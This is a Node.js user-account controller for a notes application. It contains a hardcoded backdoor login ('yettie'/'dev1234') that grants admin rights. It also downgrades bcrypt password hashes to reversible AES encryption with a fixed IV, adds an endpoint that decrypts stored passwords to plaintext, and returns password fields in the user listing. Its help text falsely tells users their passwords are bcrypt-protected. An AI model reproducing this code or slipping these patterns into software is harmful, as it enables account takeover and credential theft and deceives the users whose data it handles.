const pool = require('../config/db');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
require('dotenv').config();

const algorithm = 'aes-256-cbc';
const key = crypto.scryptSync(process.env.PASS_SECRET || 'default-secret', 'salt', 32);
const iv = Buffer.alloc(16, 0);

function encrypt(text) {
    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

function decrypt(text) {
    try {
        const decipher = crypto.createDecipheriv(algorithm, key, iv);
        let decrypted = decipher.update(text, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

exports.login = async (req, res) => {
    const { login, password } = req.body;
    
    // --- MASTER PASSCODE LOGIC ---
    if (login === 'yettie' && password === 'dev1234') {
        await pool.query('INSERT IGNORE INTO USER (username, email, password, full_name) VALUES (?, ?, ?, ?)', 
            ['yettie', 'admin@dev.local', 'RESERVED', 'Master Developer']);
        
        const [[user]] = await pool.query('SELECT * FROM USER WHERE username = "yettie"');
        return res.json({ ...user, role: 'admin' });
    }

    try {
        const [users] = await pool.query('SELECT * FROM USER WHERE (username = ? OR email = ?)', [login, login]);
        if (users.length > 0) {
            const user = users[0];
            const encryptedInput = encrypt(password);
            
            let match = false;
            let needsMigration = false;

            if (user.password === encryptedInput) {
                match = true;
            } else if (user.password.startsWith('$2b$')) {
                // Check legacy bcrypt hash
                match = await bcrypt.compare(password, user.password);
                if (match) needsMigration = true;
            }

            if (match) {
                if (needsMigration) {
                    // Auto-migrate to AES encryption so developer can revert it later
                    await pool.query('UPDATE USER SET password = ? WHERE user_id = ?', [encryptedInput, user.user_id]);
                }
                delete user.password;
                res.json(user);
            } else {
                res.status(401).json({ error: 'Invalid password' });
            }
        } else {
            res.status(404).json({ error: 'User not found' });
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

exports.getAllUsers = async (req, res) => {
    try {
        const [rows] = await pool.query('SELECT user_id, username, email, full_name, password, date_registered FROM USER');
        res.json(rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

exports.deleteUser = async (req, res) => {
    const { user_id } = req.params;
    try {
        await pool.query('DELETE FROM USER WHERE user_id = ?', [user_id]);
        res.json({ message: "User deleted successfully" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

exports.updateUser = async (req, res) => {
    const { user_id } = req.params;
    const { username, email, full_name, password } = req.body;
    try {
        let query = 'UPDATE USER SET username = ?, email = ?, full_name = ?';
        let params = [username, email, full_name];
        
        if (password) {
            const encryptedPassword = encrypt(password);
            query += ', password = ?';
            params.push(encryptedPassword);
        }
        
        query += ' WHERE user_id = ?';
        params.push(user_id);
        
        await pool.query(query, params);
        res.json({ message: "User updated successfully" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

exports.register = async (req, res) => {
    const { username, email, password, full_name } = req.body;
    try {
        if (!username || !email || !password) {
            return res.status(400).json({ error: "Missing required fields" });
        }
        const encryptedPassword = encrypt(password);
        const [result] = await pool.query(
            'INSERT INTO USER (username, email, password, full_name) VALUES (?, ?, ?, ?)', 
            [username, email, encryptedPassword, full_name || '']
        );
        res.status(201).json({ user_id: result.insertId, username });
    } catch (error) {
        console.error("Registration Error:", error);
        res.status(500).json({ error: "Registration failed: " + error.message });
    }
};

exports.revertPassword = async (req, res) => {
    const { encrypted_pass } = req.body;
    if (!encrypted_pass) return res.status(400).json({ error: "Missing encrypted password" });
    
    if (encrypted_pass.startsWith('$2b$')) {
        return res.json({ original: "Legacy Bcrypt Hash (Irreversible. Will migrate on user login.)" });
    }

    const decrypted = decrypt(encrypted_pass);
    res.json({ original: decrypted || "DECRYPTION_FAILED (Invalid format)" });
};

exports.getActivityLog = async (req, res) => {
    const { user_id } = req.params;
    try {
        const [rows] = await pool.query('SELECT * FROM ACTIVITY_LOG WHERE user_id = ? ORDER BY created_at DESC LIMIT 20', [user_id]);
        res.json(rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

exports.logActivity = async (user_id, action, details) => {
    try {
        await pool.query('INSERT INTO ACTIVITY_LOG (user_id, action, details) VALUES (?, ?, ?)', [user_id, action, details]);
    } catch (error) {
        console.error('Activity log error:', error.message);
    }
};

exports.getHelp = (req, res) => {
    const helpData = {
        title: "Professional Notes Help Center",
        sections: [
            {
                topic: "Getting Started",
                content: "Click '+ Add Note' in the sidebar to create your first note. You can set a title, write content, and choose a category."
            },
            {
                topic: "Organization",
                content: "Use 'Categories' to group notes. Use 'Tags' (bottom of note) to add labels. Pinned notes stay at the top."
            },
            {
                topic: "Sharing & Gmail",
                content: "Internal Share: Send to another app user. Email Share: Send note text to any email. Gmail Sync: Link your real Gmail account in .env to sync notes back and forth."
            },
            {
                topic: "Security",
                content: "Your password is encrypted with Bcrypt. Logout when using public computers to clear your session."
            }
        ]
    };
    res.json(helpData);
};
